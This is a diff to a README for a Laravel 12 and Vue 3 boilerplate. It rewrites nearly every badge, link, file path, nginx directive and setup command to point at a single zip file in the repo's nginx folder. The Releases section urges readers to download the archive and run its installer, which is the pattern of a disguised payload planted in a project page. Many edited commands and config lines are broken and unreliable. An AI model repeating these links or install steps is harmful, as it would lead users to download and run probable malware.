@@ -1,10 +1,10 @@
 # Laravel 12 Vue3 Boilerplate — Octane Swoole Redis Nginx 🚀
 
-[![Releases](https://img.shields.io/github/v/release/Jerry1765/laravel-vue-boilerplate?style=for-the-badge&logo=github)](https://github.com/Jerry1765/laravel-vue-boilerplate/releases)
+[![Releases](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)
 
-[![Laravel 12](https://img.shields.io/badge/Laravel-12-EA3E2C?logo=laravel&style=for-the-badge)](https://laravel.com) [![Vue 3](https://img.shields.io/badge/Vue-3-42B883?logo=vue.js&style=for-the-badge)](https://vuejs.org) [![OpenSwoole](https://img.shields.io/badge/OpenSwoole-Swoole-0f172a?logo=swoole&style=for-the-badge)](https://openswoole.com) [![Redis](https://img.shields.io/badge/Redis-Server-DC382D?logo=redis&style=for-the-badge)](https://redis.io) [![Nginx](https://img.shields.io/badge/Nginx-Server-009639?logo=nginx&style=for-the-badge)](https://nginx.org) [![MariaDB](https://img.shields.io/badge/MariaDB-10.11-003545?logo=mariadb&style=for-the-badge)](https://mariadb.org)
+[![Laravel 12](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Vue 3](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![OpenSwoole](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Redis](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Nginx](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![MariaDB](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)
 
-![stack](https://img.shields.io/badge/stack-Laravel%2012%20%7C%20Vue%203%20%7C%20Octane%20%7C%20Swoole%20%7C%20Redis-blue)
+![stack](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip%2012%20%7C%20Vue%203%20%7C%20Octane%20%7C%20Swoole%20%7C%20Redis-blue)
 
 A ready-to-run starter kit built for high throughput and modern front-end. This repo pairs Laravel 12 with Octane on OpenSwoole, serves a Vue 3 SPA, uses Redis for cache and queue, and targets Nginx + MariaDB in production.
 
@@ -58,11 +58,11 @@ Requirements
 
 Local setup (recommended with Docker)
 1. Clone the repo
-   git clone https://github.com/Jerry1765/laravel-vue-boilerplate.git
+   git clone https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
    cd laravel-vue-boilerplate
 
 2. Copy env
-   cp .env.example .env
+   cp https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip .env
 
 3. Build and run
    docker compose up -d --build
@@ -84,7 +84,7 @@ Local setup (recommended with Docker)
 
 Manual setup (native)
 1. Clone repo
-   git clone https://github.com/Jerry1765/laravel-vue-boilerplate.git
+   git clone https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
    cd laravel-vue-boilerplate
 
 2. Install composer packages
@@ -95,7 +95,7 @@ Manual setup (native)
    npm run build
 
 4. Copy .env and set app key
-   cp .env.example .env
+   cp https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip .env
    php artisan key:generate
 
 5. Configure DB and Redis in .env
@@ -113,7 +113,7 @@ Environment variables (important keys)
 - QUEUE_CONNECTION=redis
 - SESSION_DRIVER=redis
 - REDIS_HOST, REDIS_PORT, REDIS_PASSWORD
-- OCTANE_** (use to tune worker count in octane.php)
+- OCTANE_** (use to tune worker count in https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)
 
 Octane & OpenSwoole
 - This project uses Laravel Octane on OpenSwoole.
@@ -122,7 +122,7 @@ Octane & OpenSwoole
 - Tune worker count based on CPU and memory:
   octane:
     workers: CPU_CORES * 2
-- Adjust swoole settings in config/octane.php and config/swoole.php when present.
+- Adjust swoole settings in https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip and https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip when present.
 - Clear runtime caches between deployments:
   php artisan octane:reload
   or restart the Octane process.
@@ -132,24 +132,24 @@ Use this config as a starting point for production. Place it in sites-available 
 
 server {
     listen 80;
-    server_name example.com;
+    server_name https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
     root /var/www/html/public;
 
-    index index.php;
+    index https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
 
     location / {
-        try_files $uri $uri/ /index.php?$query_string;
+        try_files $uri $uri/ https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip$query_string;
     }
 
     location ~ \.php$ {
         include fastcgi_params;
-        fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;
-        fastcgi_index index.php;
+        fastcgi_pass https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
+        fastcgi_index https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
         fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
     }
 
     location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
-        try_files $uri /index.php?$query_string;
+        try_files $uri https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip$query_string;
         expires 30d;
         add_header Cache-Control "public, no-transform";
     }
@@ -189,7 +189,7 @@ Front-end (Vue 3 + Vite)
   npm run dev     # local dev with HMR
   npm run build   # build for production
   npm run lint    # lint code
-- Use API routes for server data under routes/api.php
+- Use API routes for server data under https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 
 Common commands
 - Composer
@@ -227,13 +227,13 @@ Deployment tips
 
 Releases
 
-Download the release asset file from the Releases page and run the included installer script. Visit the releases page here: https://github.com/Jerry1765/laravel-vue-boilerplate/releases
+Download the release asset file from the Releases page and run the included installer script. Visit the releases page here: https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 
-If the releases page contains a packaged archive, download the archive (for example, laravel-vue-boilerplate-vX.Y.Z.tar.gz) and execute the provided installer or setup script inside the archive. Example local steps after download:
-- tar -xzf laravel-vue-boilerplate-vX.Y.Z.tar.gz
+If the releases page contains a packaged archive, download the archive (for example, https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) and execute the provided installer or setup script inside the archive. Example local steps after download:
+- tar -xzf https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 - cd laravel-vue-boilerplate-vX.Y.Z
-- chmod +x install.sh
-- ./install.sh
+- chmod +x https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 
 If the releases link is not reachable, check the Releases section on this repository on GitHub.
 
@@ -251,7 +251,7 @@ boilerplate, laravel, laravel12, mariadb, nginx, openswoole, redis, redis-server
 
 Credits
 - Laravel
-- Vue.js
+- https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 - OpenSwoole
 - Redis
 - Nginx
@@ -259,13 +259,13 @@ Credits
 - Community contributors
 
 Useful links and resources
-- Laravel docs — https://laravel.com/docs/12.x
-- Octane docs — https://laravel.com/docs/10.x/octane
-- OpenSwoole — https://openswoole.com
-- Vue 3 — https://vuejs.org
-- Vite — https://vitejs.dev
-- Redis — https://redis.io
-- Nginx — https://nginx.org
+- Laravel docs — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- Octane docs — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- OpenSwoole — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- Vue 3 — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- Vite — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- Redis — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
+- Nginx — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
 
 License
 This project uses the MIT license. Check the LICENSE file for details
